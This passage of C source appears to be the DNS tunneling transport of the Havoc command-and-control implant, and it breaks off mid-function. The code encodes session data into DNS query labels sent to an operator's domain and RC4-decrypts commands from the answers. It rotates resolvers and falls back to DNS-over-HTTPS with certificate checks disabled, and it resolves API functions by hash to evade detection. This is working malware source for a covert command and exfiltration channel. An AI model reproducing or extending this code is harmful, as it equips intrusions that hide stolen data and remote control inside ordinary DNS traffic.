#include <core/TransportDns.h>
#include <core/MiniStd.h>
#include <core/Memory.h>

#ifdef TRANSPORT_DNS

/* RFC 4648 base32 alphabet without padding. */
static const CHAR DnsBase32Alphabet[ 32 ] = {
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '2', '3', '4', '5', '6', '7'
};

static const CHAR DnsHexDigits[ 16 ] = {
    '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
};

/* transport state */
static BOOL   DnsInitialized  = FALSE;
static BOOL   DnsHiSent       = FALSE;
static BOOL   DnsWsaStarted   = FALSE;
static DWORD  DnsSequence     = 0;
static CHAR   DnsSessionId[ 9 ] = { 0 };
static BYTE   DnsEncryptKey[ DNS_KEY_LENGTH ] = { 0 };
static CHAR   DnsDomain[ 256 ] = { 0 };
static DWORD  DnsPacketSize   = 512;
static BOOL   DnsBurstEnabled = FALSE;
static DWORD  DnsBurstSleep   = 50;
static DWORD  DnsBurstJitter  = 0;

static CHAR   DnsResolverList[ DNS_MAX_RESOLVERS ][ 64 ] = { 0 };
static ULONG  DnsResolverCount = 0;
static ULONG  DnsResolverFailCount[ DNS_MAX_RESOLVERS ] = { 0 };
static ULONG  DnsResolverDisabledUntil[ DNS_MAX_RESOLVERS ] = { 0 };
static ULONG  DnsCurrentResolver = 0;

static CHAR   DnsDohResolverList[ DNS_MAX_RESOLVERS ][ 256 ] = { 0 };
static ULONG  DnsDohResolverCount = 0;
static ULONG  DnsDohFailCount[ DNS_MAX_RESOLVERS ] = { 0 };
static ULONG  DnsDohDisabledUntil[ DNS_MAX_RESOLVERS ] = { 0 };
static ULONG  DnsCurrentDohResolver = 0;

static HMODULE DnsWininet = NULL;

static VOID DnsWriteBe32(
    _Out_ PBYTE Buffer,
    _In_  ULONG Value
) {
    Buffer[ 0 ] = ( BYTE ) ( ( Value >> 24 ) & 0xFF );
    Buffer[ 1 ] = ( BYTE ) ( ( Value >> 16 ) & 0xFF );
    Buffer[ 2 ] = ( BYTE ) ( ( Value >> 8 ) & 0xFF );
    Buffer[ 3 ] = ( BYTE ) ( Value & 0xFF );
}

static ULONG DnsReadBe32(
    _In_ PBYTE Buffer
) {
    return ( ( ULONG ) Buffer[ 0 ] << 24 ) | ( ( ULONG ) Buffer[ 1 ] << 16 ) |
           ( ( ULONG ) Buffer[ 2 ] << 8 ) | ( ULONG ) Buffer[ 3 ];
}

static ULONG DnsGetTickCount(
    VOID
) {
    if ( Instance->Win32.GetTickCount )
        return Instance->Win32.GetTickCount();

    return NtGetTickCount();
}

/*! Encodes data with the RFC 4648 base32 alphabet without padding. */
static ULONG DnsBase32Encode(
    _In_  PBYTE Data,
    _In_  ULONG Length,
    _Out_ PCHAR Out,
    _In_  ULONG OutSize
) {
    ULONG BitBuffer = 0;
    INT   BitCount  = 0;
    ULONG Written   = 0;

    if ( ! Data || ! Out || ! Length || ! OutSize )
        return 0;

    for ( ULONG i = 0; i < Length; i++ )
    {
        BitBuffer = ( BitBuffer << 8 ) | Data[ i ];
        BitCount += 8;

        while ( BitCount >= 5 )
        {
            BitCount -= 5;

            if ( Written + 1 >= OutSize )
                return 0;

            Out[ Written++ ] = DnsBase32Alphabet[ ( BitBuffer >> BitCount ) & 0x1F ];
        }
    }

    if ( BitCount > 0 )
    {
        if ( Written + 1 >= OutSize )
            return 0;

        Out[ Written++ ] = DnsBase32Alphabet[ ( BitBuffer << ( 5 - BitCount ) ) & 0x1F ];
    }

    Out[ Written ] = 0;

    return Written;
}

/*! Decodes a standard base64 string. */
static ULONG DnsBase64Decode(
    _In_  PCHAR Data,
    _In_  ULONG Length,
    _Out_ PBYTE Out,
    _In_  ULONG OutSize
) {
    ULONG Written = 0;
    INT   Value   = 0;
    INT   Bits    = -8;

    if ( ! Data || ! Out || ! Length || ! OutSize )
        return 0;

    for ( ULONG i = 0; i < Length; i++ )
    {
        UCHAR Character = ( UCHAR ) Data[ i ];
        INT   Digit     = -1;

        if ( Character >= 'A' && Character <= 'Z' )
            Digit = Character - 'A';
        else if ( Character >= 'a' && Character <= 'z' )
            Digit = Character - 'a' + 26;
        else if ( Character >= '0' && Character <= '9' )
            Digit = Character - '0' + 52;
        else if ( Character == '+' )
            Digit = 62;
        else if ( Character == '/' )
            Digit = 63;
        else
            continue;

        Value = ( Value << 6 ) | Digit;
        Bits += 6;

        if ( Bits >= 0 )
        {
            if ( Written >= OutSize )
                return 0;

            Out[ Written++ ] = ( BYTE ) ( ( Value >> Bits ) & 0xFF );
            Bits -= 8;
        }
    }

    return Written;
}

/*! Encrypts or decrypts data with RC4. */
static VOID DnsRc4Crypt(
    _Inout_ PBYTE Data,
    _In_    ULONG Length,
    _In_    PBYTE Key,
    _In_    ULONG KeyLength
) {
    BYTE State[ 256 ];
    BYTE i = 0;
    BYTE j = 0;

    if ( ! Data || ! Length || ! Key || ! KeyLength )
        return;

    for ( i = 0; i < 256; i++ )
        State[ i ] = i;

    for ( i = 0; i < 256; i++ )
    {
        BYTE Temporary = 0;

        j = ( BYTE ) ( j + State[ i ] + Key[ i % KeyLength ] );

        Temporary   = State[ i ];
        State[ i ]  = State[ j ];
        State[ j ]  = Temporary;
    }

    i = 0;
    j = 0;

    for ( ULONG k = 0; k < Length; k++ )
    {
        BYTE Temporary = 0;

        i = ( BYTE ) ( i + 1 );
        j = ( BYTE ) ( j + State[ i ] );

        Temporary  = State[ i ];
        State[ i ] = State[ j ];
        State[ j ] = Temporary;

        Data[ k ] = ( BYTE ) ( Data[ k ] ^ State[ ( BYTE ) ( State[ i ] + State[ j ] ) ] );
    }
}

static BOOL DnsAppendString(
    _Out_   PCHAR  Out,
    _In_    ULONG  OutSize,
    _Inout_ PULONG Offset,
    _In_    PCHAR  Value
) {
    ULONG Length = ( ULONG ) StringLengthA( Value );

    if ( *Offset + Length + 1 > OutSize )
        return FALSE;

    MemCopy( Out + *Offset, Value, Length );
    *Offset += Length;
    Out[ *Offset ] = 0;

    return TRUE;
}

/*!
 * Builds the QNAME of a query.
 *
 * The label order is fixed by the protocol:
 * {SID}.{OP}.{SEQ}.{IDX}.{DATA_LABELS}.{DOMAIN}
 */
static BOOL DnsBuildQueryName(
    _In_  PCHAR Sid,
    _In_  PCHAR Op,
    _In_  ULONG Sequence,
    _In_  PCHAR Index,
    _In_  PCHAR DataLabels,
    _In_  PCHAR Domain,
    _Out_ PCHAR Out,
    _In_  ULONG OutSize
) {
    CHAR   SequenceText[ 9 ] = { 0 };
    ULONG  Offset = 0;
    ULONG  Value  = Sequence ^ DNS_SEQ_XOR_MASK;

    for ( INT i = 7; i >= 0; i-- )
        SequenceText[ 7 - i ] = DnsHexDigits[ ( Value >> ( i * 4 ) ) & 0xF ];

    SequenceText[ 8 ] = 0;

    if ( ! DnsAppendString( Out, OutSize, &Offset, Sid ) )         return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, "." ) )         return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, Op ) )          return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, "." ) )         return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, SequenceText ) ) return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, "." ) )         return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, Index ) )       return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, "." ) )         return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, DataLabels ) )  return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, "." ) )         return FALSE;
    if ( ! DnsAppendString( Out, OutSize, &Offset, Domain ) )      return FALSE;

    return TRUE;
}

/*! Encodes a host name into the wire format. */
static INT DnsEncodeName(
    _In_  PCHAR Host,
    _Out_ PBYTE Buffer,
    _In_  INT  BufferSize
) {
    INT   Length = 0;
    PCHAR Pointer = Host;

    if ( ! Host || ! Buffer || BufferSize <= 1 )
        return -1;

    while ( *Pointer )
    {
        PCHAR Start = Pointer;
        INT   LabelLength = 0;

        while ( *Pointer && *Pointer != '.' )
        {
            Pointer++;
            LabelLength++;
        }

        if ( LabelLength == 0 )
            break;

        if ( LabelLength > DNS_LABEL_SIZE )
            LabelLength = DNS_LABEL_SIZE;

        if ( Length + 1 + LabelLength + 1 > BufferSize )
            return -1;

        Buffer[ Length++ ] = ( BYTE ) LabelLength;
        MemCopy( Buffer + Length, Start, ( SIZE_T ) LabelLength );
        Length += LabelLength;

        if ( *Pointer == '.' )
            Pointer++;
    }

    if ( Length + 1 > BufferSize )
        return -1;

    Buffer[ Length++ ] = 0;

    return Length;
}

static USHORT DnsParseQtype(
    _In_ PCHAR QtypeString
) {
    if ( ! QtypeString || ! QtypeString[ 0 ] )
        return 16;

    if ( QtypeString[ 0 ] == 'A' || QtypeString[ 0 ] == 'a' )
    {
        if ( ! QtypeString[ 1 ] )
            return 1;

        if ( ( QtypeString[ 1 ] == 'A' || QtypeString[ 1 ] == 'a' ) && ! QtypeString[ 2 ] )
            return 28;
    }

    return 16;
}

BOOL BuildDnsWireQuery(
    _In_  PCHAR  Qname,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutLength
) {
    USHORT Id = 0;
    USHORT Qtype = 0;
    ULONG  Offset = 0;
    INT    NameLength = 0;

    if ( ! OutBuffer || OutBufferSize < 512 || ! OutLength )
        return FALSE;

    *OutLength = 0;
    MemSet( OutBuffer, 0, OutBufferSize );

    Id = ( USHORT ) ( DnsGetTickCount() & 0xFFFF );

    OutBuffer[ 0 ] = ( BYTE ) ( Id >> 8 );
    OutBuffer[ 1 ] = ( BYTE ) ( Id & 0xFF );
    OutBuffer[ 2 ] = 0x01; /* RD */
    OutBuffer[ 3 ] = 0x00;
    OutBuffer[ 4 ] = 0x00;
    OutBuffer[ 5 ] = 0x01; /* QDCOUNT */

    Offset = 12;

    NameLength = DnsEncodeName( Qname, OutBuffer + Offset, ( INT ) ( OutBufferSize - Offset - 4 ) );
    if ( NameLength < 0 )
        return FALSE;

    Offset += ( ULONG ) NameLength;

    Qtype = DnsParseQtype( QtypeString );

    OutBuffer[ Offset++ ] = ( BYTE ) ( Qtype >> 8 );
    OutBuffer[ Offset++ ] = ( BYTE ) ( Qtype & 0xFF );
    OutBuffer[ Offset++ ] = 0x00;
    OutBuffer[ Offset++ ] = 0x01; /* IN */

    *OutLength = Offset;

    return TRUE;
}

BOOL ParseDnsWireResponse(
    _In_  PBYTE  Response,
    _In_  ULONG  ResponseLength,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutSize
) {
    USHORT Qtype = 0;
    INT    QuestionCount = 0;
    INT    AnswerCount = 0;
    INT    Position = 12;
    ULONG  Written = 0;

    if ( ! OutSize )
        return FALSE;

    *OutSize = 0;

    if ( ! Response || ResponseLength <= 12 || ! OutBuffer )
        return FALSE;

    Qtype = DnsParseQtype( QtypeString );

    QuestionCount = ( Response[ 4 ] << 8 ) | Response[ 5 ];
    AnswerCount = ( Response[ 6 ] << 8 ) | Response[ 7 ];

    /* skip the questions */
    for ( INT i = 0; i < QuestionCount; i++ )
    {
        while ( Position < ( INT ) ResponseLength && Response[ Position ] != 0 )
        {
            if ( ( Response[ Position ] & 0xC0 ) == 0xC0 )
            {
                Position += 2;
                break;
            }

            Position += Response[ Position ] + 1;
        }

        Position++;
        Position += 4;
    }

    for ( INT i = 0; i < AnswerCount; i++ )
    {
        USHORT Type = 0;
        USHORT DataLength = 0;

        if ( Position + 12 > ( INT ) ResponseLength )
            return FALSE;

        if ( ( Response[ Position ] & 0xC0 ) == 0xC0 )
        {
            Position += 2;
        }
        else
        {
            while ( Position < ( INT ) ResponseLength && Response[ Position ] != 0 )
                Position += Response[ Position ] + 1;

            Position++;
        }

        if ( Position + 10 > ( INT ) ResponseLength )
            return FALSE;

        Type = ( Response[ Position ] << 8 ) | Response[ Position + 1 ];
        Position += 2;
        Position += 2; /* class */
        Position += 4; /* ttl */

        DataLength = ( Response[ Position ] << 8 ) | Response[ Position + 1 ];
        Position += 2;

        if ( Position + DataLength > ( INT ) ResponseLength )
            return FALSE;

        if ( Qtype == 16 && Type == 16 && DataLength > 0 )
        {
            USHORT Consumed = 0;
            ULONG  TextWritten = 0;

            while ( Consumed < DataLength )
            {
                BYTE TextLength = 0;

                if ( Position + Consumed >= ( INT ) ResponseLength )
                    break;

                TextLength = Response[ Position + Consumed ];
                Consumed++;

                if ( Consumed + TextLength > DataLength )
                    break;

                if ( TextLength > 0 && TextWritten + TextLength <= OutBufferSize )
                {
                    MemCopy( OutBuffer + TextWritten, Response + Position + Consumed, ( SIZE_T ) TextLength );
                    TextWritten += TextLength;
                }

                Consumed += TextLength;
            }

            if ( TextWritten > 0 )
            {
                *OutSize = TextWritten;
                return TRUE;
            }
        }
        else if ( Qtype == 1 && Type == 1 && DataLength >= 4 )
        {
            if ( Written + 4 <= OutBufferSize )
            {
                MemCopy( OutBuffer + Written, Response + Position, 4 );
                Written += 4;
            }
        }
        else if ( Qtype == 28 && Type == 28 && DataLength >= 16 )
        {
            if ( Written + 16 <= OutBufferSize )
            {
                MemCopy( OutBuffer + Written, Response + Position, 16 );
                Written += 16;
            }
        }

        Position += DataLength;
    }

    if ( ( Qtype == 1 || Qtype == 28 ) && Written > 0 )
    {
        *OutSize = Written;
        return TRUE;
    }

    return FALSE;
}

BOOL ParsePutAckResponse(
    _In_  PBYTE  Response,
    _In_  ULONG  ResponseLength,
    _Out_ PULONG OutNextExpected,
    _Out_ BOOL*  OutComplete,
    _Out_ BOOL*  OutNeedsReset
) {
    BYTE  Flags = 0;
    ULONG NextExpected = 0;

    if ( ! Response || ResponseLength < 4 )
        return FALSE;

    Flags = Response[ 0 ];

    NextExpected = ( ( ULONG ) Response[ 1 ] << 16 ) |
                   ( ( ULONG ) Response[ 2 ] << 8 ) |
                    ( ULONG ) Response[ 3 ];

    if ( OutComplete )
        *OutComplete = ( Flags & 0x01 ) ? TRUE : FALSE;

    if ( OutNeedsReset )
        *OutNeedsReset = ( Flags & 0x02 ) ? TRUE : FALSE;

    if ( OutNextExpected )
        *OutNextExpected = NextExpected;

    return TRUE;
}

static BOOL DnsEnsureWsa(
    VOID
) {
    WSADATA WsaData = { 0 };

    if ( DnsWsaStarted )
        return TRUE;

    if ( ! Instance->Win32.WSAStartup )
        return FALSE;

    if ( Instance->Win32.WSAStartup( MAKEWORD( 2, 2 ), &WsaData ) != 0 )
        return FALSE;

    DnsWsaStarted = TRUE;

    return TRUE;
}

static BOOL DnsEnsureDoH(
    VOID
) {
    if ( Instance->Win32.InternetOpenA && Instance->Win32.HttpSendRequestA )
        return TRUE;

    if ( ! Instance->Win32.LoadLibraryW )
        return FALSE;

    if ( ! DnsWininet )
    {
        DnsWininet = Instance->Win32.LoadLibraryW( L"wininet.dll" );
        if ( ! DnsWininet )
            return FALSE;
    }

    Instance->Win32.InternetOpenA              = ( DNS_FUNC_INTERNETOPENA ) LdrFunctionAddr( DnsWininet, H_FUNC_INTERNETOPENA );
    Instance->Win32.InternetConnectA           = ( DNS_FUNC_INTERNETCONNECTA ) LdrFunctionAddr( DnsWininet, H_FUNC_INTERNETCONNECTA );
    Instance->Win32.HttpOpenRequestA           = ( DNS_FUNC_HTTPOPENREQUESTA ) LdrFunctionAddr( DnsWininet, H_FUNC_HTTPOPENREQUESTA );
    Instance->Win32.HttpSendRequestA           = ( DNS_FUNC_HTTPSENDREQUESTA ) LdrFunctionAddr( DnsWininet, H_FUNC_HTTPSENDREQUESTA );
    Instance->Win32.InternetSetOptionA         = ( DNS_FUNC_INTERNETSETOPTIONA ) LdrFunctionAddr( DnsWininet, H_FUNC_INTERNETSETOPTIONA );
    Instance->Win32.InternetQueryOptionA       = ( DNS_FUNC_INTERNETQUERYOPTIONA ) LdrFunctionAddr( DnsWininet, H_FUNC_INTERNETQUERYOPTIONA );
    Instance->Win32.HttpQueryInfoA             = ( DNS_FUNC_HTTPQUERYINFOA ) LdrFunctionAddr( DnsWininet, H_FUNC_HTTPQUERYINFOA );
    Instance->Win32.InternetQueryDataAvailable = ( DNS_FUNC_INTERNETQUERYDATAAVAILABLE ) LdrFunctionAddr( DnsWininet, H_FUNC_INTERNETQUERYDATAAVAILABLE );
    Instance->Win32.InternetCloseHandle        = ( DNS_FUNC_INTERNETCLOSEHANDLE ) LdrFunctionAddr( DnsWininet, H_FUNC_INTERNETCLOSEHANDLE );
    Instance->Win32.InternetReadFile           = ( DNS_FUNC_INTERNETREADFILE ) LdrFunctionAddr( DnsWininet, H_FUNC_INTERNETREADFILE );

    return Instance->Win32.InternetOpenA && Instance->Win32.HttpSendRequestA &&
           Instance->Win32.InternetConnectA && Instance->Win32.HttpOpenRequestA &&
           Instance->Win32.InternetCloseHandle && Instance->Win32.InternetReadFile;
}

BOOL QuerySingle(
    _In_  PCHAR  Qname,
    _In_  PCHAR  Resolver,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutSize
) {
    BYTE             Query[ 1024 ];
    BYTE             Response[ 4096 ];
    ULONG            QueryLength = 0;
    ULONG            Received = 0;
    SOCKET           SocketFd = INVALID_SOCKET;
    struct sockaddr_in Address;
    struct hostent*  Host = NULL;
    fd_set           ReadSet;
    struct timeval   Timeout;
    int              Result = 0;
    int              AddressLength = 0;

    if ( ! OutSize )
        return FALSE;

    *OutSize = 0;

    if ( ! Instance->Win32.sendto || ! Instance->Win32.recvfrom ||
         ! Instance->Win32.select || ! Instance->Win32.socket ||
         ! Instance->Win32.gethostbyname || ! Instance->Win32.closesocket )
        return FALSE;

    if ( ! Resolver || ! Resolver[ 0 ] )
        return FALSE;

    if ( ! DnsEnsureWsa() )
        return FALSE;

    if ( ! BuildDnsWireQuery( Qname, QtypeString, Query, sizeof( Query ), &QueryLength ) )
        return FALSE;

    Host = Instance->Win32.gethostbyname( Resolver );
    if ( ! Host || ! Host->h_addr_list || ! Host->h_addr_list[ 0 ] )
        return FALSE;

    MemSet( ( PBYTE ) &Address, 0, sizeof( Address ) );
    Address.sin_family = AF_INET;
    Address.sin_port = htons( 53 );
    MemCopy( &Address.sin_addr, Host->h_addr_list[ 0 ], ( SIZE_T ) Host->h_length );

    SocketFd = Instance->Win32.socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP );
    if ( SocketFd == INVALID_SOCKET )
        return FALSE;

    Result = Instance->Win32.sendto(
        SocketFd,
        ( const char* ) Query,
        ( int ) QueryLength,
        0,
        ( struct sockaddr* ) &Address,
        ( int ) sizeof( Address )
    );

    if ( Result != ( int ) QueryLength )
    {
        Instance->Win32.closesocket( SocketFd );
        return FALSE;
    }

    FD_ZERO( &ReadSet );
    FD_SET( SocketFd, &ReadSet );

    Timeout.tv_sec = DNS_QUERY_TIMEOUT;
    Timeout.tv_usec = 0;

    Result = Instance->Win32.select( 0, &ReadSet, NULL, NULL, &Timeout );
    if ( Result <= 0 )
    {
        Instance->Win32.closesocket( SocketFd );
        return FALSE;
    }

    AddressLength = ( int ) sizeof( Address );

    Received = ( ULONG ) Instance->Win32.recvfrom(
        SocketFd,
        ( char* ) Response,
        ( int ) sizeof( Response ),
        0,
        ( struct sockaddr* ) &Address,
        &AddressLength
    );

    Instance->Win32.closesocket( SocketFd );

    if ( Received <= 12 )
        return FALSE;

    return ParseDnsWireResponse( Response, Received, QtypeString, OutBuffer, OutBufferSize, OutSize );
}

/*! Splits a resolver url into host, port and path. */
static BOOL DnsParseResolverUrl(
    _In_  PCHAR  Url,
    _Out_ PCHAR  Host,
    _In_  ULONG  HostSize,
    _Out_ PUSHORT Port,
    _Out_ PCHAR  Path,
    _In_  ULONG  PathSize
) {
    PCHAR Pointer = Url;
    ULONG Length = 0;

    if ( ! Url || ! Host || ! Path || ! Port )
        return FALSE;

    if ( ( Pointer[ 0 ] == 'h' || Pointer[ 0 ] == 'H' ) &&
         ( Pointer[ 1 ] == 't' || Pointer[ 1 ] == 'T' ) &&
         ( Pointer[ 2 ] == 't' || Pointer[ 2 ] == 'T' ) &&
         ( Pointer[ 3 ] == 'p' || Pointer[ 3 ] == 'P' ) )
    {
        Pointer += 4;

        if ( Pointer[ 0 ] == 's' || Pointer[ 0 ] == 'S' )
            Pointer++;

        if ( Pointer[ 0 ] == ':' && Pointer[ 1 ] == '/' && Pointer[ 2 ] == '/' )
            Pointer += 3;
    }

    while ( Pointer[ 0 ] && Pointer[ 0 ] != '/' && Pointer[ 0 ] != ':' )
    {
        if ( Length + 1 >= HostSize )
            return FALSE;

        Host[ Length++ ] = Pointer[ 0 ];
        Pointer++;
    }

    Host[ Length ] = 0;

    *Port = 443;

    if ( Pointer[ 0 ] == ':' )
    {
        USHORT Value = 0;

        Pointer++;

        while ( Pointer[ 0 ] >= '0' && Pointer[ 0 ] <= '9' )
        {
            Value = ( USHORT ) ( Value * 10 + ( Pointer[ 0 ] - '0' ) );
            Pointer++;
        }

        if ( Value )
            *Port = Value;
    }

    if ( Pointer[ 0 ] == '/' )
    {
        Length = 0;

        while ( Pointer[ 0 ] && Length + 1 < PathSize )
        {
            Path[ Length++ ] = Pointer[ 0 ];
            Pointer++;
        }

        Path[ Length ] = 0;
    }
    else
    {
        StringCopyA( Path, "/dns-query" );
    }

    return Host[ 0 ] != 0;
}

BOOL QueryDoH(
    _In_  PCHAR  Qname,
    _In_  PCHAR  ResolverUrl,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutSize
) {
    BYTE        Query[ 1024 ];
    BYTE        Response[ 4096 ];
    ULONG       QueryLength = 0;
    ULONG       TotalRead = 0;
    CHAR        Host[ 256 ] = { 0 };
    CHAR        Path[ 128 ] = { 0 };
    CHAR        AcceptTypes[] = "application/dns-message";
    CHAR        Headers[] = "Content-Type: application/dns-message\r\nAccept: application/dns-message\r\n";
    CHAR        StatusCode[ 32 ] = { 0 };
    DWORD       StatusCodeLength = sizeof( StatusCode );
    DWORD       Available = 0;
    DWORD       BytesRead = 0;
    USHORT      Port = 443;
    HINTERNET   Internet = NULL;
    HINTERNET   Connection = NULL;
    HINTERNET   Request = NULL;
    LPCSTR      AcceptTypesArray[ 2 ] = { AcceptTypes, NULL };
    DWORD       Flags = 0;
    DWORD       BufferLength = sizeof( DWORD );
    BOOL        Success = FALSE;

    if ( ! OutSize )
        return FALSE;

    *OutSize = 0;

    if ( ! DnsEnsureDoH() )
        return FALSE;

    if ( ! DnsParseResolverUrl( ResolverUrl, Host, sizeof( Host ), &Port, Path, sizeof( Path ) ) )
        return FALSE;

    if ( ! BuildDnsWireQuery( Qname, QtypeString, Query, sizeof( Query ), &QueryLength ) )
        return FALSE;

    Internet = Instance->Win32.InternetOpenA( "Havoc", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
    if ( ! Internet )
        return FALSE;

    Connection = Instance->Win32.InternetConnectA(
        Internet, Host, Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    );

    if ( ! Connection )
    {
        Instance->Win32.InternetCloseHandle( Internet );
        return FALSE;
    }

    Flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
            INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI |
            INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_SECURE;

    Request = Instance->Win32.HttpOpenRequestA(
        Connection, "POST", Path, NULL, NULL, AcceptTypesArray, Flags, 0
    );

    if ( ! Request )
    {
        Instance->Win32.InternetCloseHandle( Connection );
        Instance->Win32.InternetCloseHandle( Internet );
        return FALSE;
    }

    if ( Instance->Win32.InternetQueryOptionA && Instance->Win32.InternetSetOptionA )
    {
        DWORD SecurityFlags = 0;

        if ( Instance->Win32.InternetQueryOptionA( Request, INTERNET_OPTION_SECURITY_FLAGS, &SecurityFlags, &BufferLength, NULL ) )
        {
            SecurityFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
            Instance->Win32.InternetSetOptionA( Request, INTERNET_OPTION_SECURITY_FLAGS, &SecurityFlags, sizeof( SecurityFlags ) );
        }
    }

    if ( Instance->Win32.HttpSendRequestA( Request, Headers, ( DWORD ) -1, ( LPVOID ) Query, QueryLength ) )
    {
        if ( Instance->Win32.HttpQueryInfoA( Request, HTTP_QUERY_STATUS_CODE, StatusCode, &StatusCodeLength, 0 ) )
        {
            int Status = 0;

            for ( int i = 0; StatusCode[ i ] >= '0' && StatusCode[ i ] <= '9'; i++ )
                Status = Status * 10 + ( StatusCode[ i ] - '0' );

            if ( Status == 200 && Instance->Win32.InternetQueryDataAvailable && Instance->Win32.InternetReadFile )
            {
                while ( Instance->Win32.InternetQueryDataAvailable( Request, &Available, 0, 0 ) && Available > 0 )
                {
                    if ( TotalRead + Available > sizeof( Response ) )
                        Available = ( DWORD ) ( sizeof( Response ) - TotalRead );

                    if ( Available == 0 )
                        break;

                    if ( Instance->Win32.InternetReadFile( Request, Response + TotalRead, Available, &BytesRead ) )
                    {
                        TotalRead += BytesRead;

                        if ( BytesRead == 0 )
                            break;
                    }
                    else
                    {
                        break;
                    }
                }

                if ( TotalRead > 12 )
                    Success = ParseDnsWireResponse( Response, TotalRead, QtypeString, OutBuffer, OutBufferSize, OutSize );
            }
        }
    }

    Instance->Win32.InternetCloseHandle( Request );
    Instance->Win32.InternetCloseHandle( Connection );
    Instance->Win32.InternetCloseHandle( Internet );

    return Success;
}

/*! Splits a resolver list into its entries. */
static VOID DnsParseResolverList(
    _In_    PCHAR  List,
    _Out_   PCHAR  Entries,
    _In_    ULONG  EntrySize,
    _In_    ULONG  MaxEntries,
    _Out_   PULONG Count
) {
    PCHAR Pointer = List;

    *Count = 0;

    if ( ! List || ! Entries )
        return;

    while ( *Pointer && *Count < MaxEntries )
    {
        ULONG Length = 0;

        while ( *Pointer == ' ' || *Pointer == '\t' || *Pointer == ',' ||
                *Pointer == ';' || *Pointer == '\r' || *Pointer == '\n' )
            Pointer++;

        if ( ! *Pointer )
            break;

        while ( *Pointer && *Pointer != ',' && *Pointer != ';' &&
                *Pointer != ' ' && *Pointer != '\t' && *Pointer != '\r' && *Pointer != '\n' )
        {
            if ( Length + 1 < EntrySize )
                Entries[ *Count * EntrySize + Length++ ] = *Pointer;

            Pointer++;
        }

        Entries[ *Count * EntrySize + Length ] = 0;

        if ( Length > 0 )
            ( *Count )++;
    }
}

/*! Queries the plain resolvers and falls back to the DoH resolvers. */
static BOOL DnsQueryWithRotation(
    _In_  PCHAR  Qname,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutSize
) {
    ULONG Now = 0;

    if ( ! OutSize )
        return FALSE;

    *OutSize = 0;

    for ( ULONG i = 0; i < DnsResolverCount; i++ )
    {
        ULONG Index = ( DnsCurrentResolver + i ) % DnsResolverCount;

        if ( DnsResolverDisabledUntil[ Index ] && DnsGetTickCount() < DnsResolverDisabledUntil[ Index ] )
            continue;

        if ( QuerySingle( Qname, DnsResolverList[ Index ], QtypeString, OutBuffer, OutBufferSize, OutSize ) )
        {
            DnsCurrentResolver = Index;
            DnsResolverFailCount[ Index ] = 0;
            DnsResolverDisabledUntil[ Index ] = 0;
            return TRUE;
        }

        DnsResolverFailCount[ Index ]++;

        if ( DnsResolverFailCount[ Index ] >= DNS_MAX_FAIL_COUNT )
        {
            Now = DnsGetTickCount();
            DnsResolverDisabledUntil[ Index ] = Now + 30000 + ( Now & 0x0FFF );
            DnsResolverFailCount[ Index ] = 0;
        }
    }

    /* the plain DNS resolvers did not answer, try the DoH resolvers */
    for ( ULONG i = 0; i < DnsDohResolverCount; i++ )
    {
        ULONG Index = ( DnsCurrentDohResolver + i ) % DnsDohResolverCount;

        if ( DnsDohDisabledUntil[ Index ] && DnsGetTickCount() < DnsDohDisabledUntil[ Index ] )
            continue;

        if ( QueryDoH( Qname, DnsDohResolverList[ Index ], QtypeString, OutBuffer, OutBufferSize, OutSize ) )
        {
            DnsCurrentDohResolver = Index;
            DnsDohFailCount[ Index ] = 0;
            DnsDohDisabledUntil[ Index ] = 0;
            return TRUE;
        }

        DnsDohFailCount[ Index ]++;

        if ( DnsDohFailCount[ Index ] >= DNS_MAX_FAIL_COUNT )
        {
            Now = DnsGetTickCount();
            DnsDohDisabledUntil[ Index ] = Now + 30000 + ( Now & 0x0FFF );
            DnsDohFailCount[ Index ] = 0;
        }
    }

    return FALSE;
}

/*! Copies the transport configuration into the module state. */
static BOOL DnsInitialize(
    VOID
) {
    if ( DnsInitialized )
        return TRUE;

    if ( ! Instance->Config.Transport.Domain )
        return FALSE;

    WCharStringToCharString( DnsDomain, Instance->Config.Transport.Domain, sizeof( DnsDomain ) );

    {
        ULONG Length = ( ULONG ) StringLengthA( DnsDomain );

        while ( Length > 0 && DnsDomain[ Length - 1 ] == '.' )
            DnsDomain[ --Length ] = 0;
    }

    if ( ! DnsDomain[ 0 ] )
        return FALSE;

    MemCopy( DnsEncryptKey, Instance->Config.Transport.EncryptKey, DNS_KEY_LENGTH );

    DnsPacketSize = Instance->Config.Transport.PktSize;
    if ( ! DnsPacketSize )
        DnsPacketSize = 512;

    DnsBurstEnabled = Instance->Config.Transport.BurstEnabled;
    DnsBurstSleep = Instance->Config.Transport.BurstSleep;
    if ( ! DnsBurstSleep )
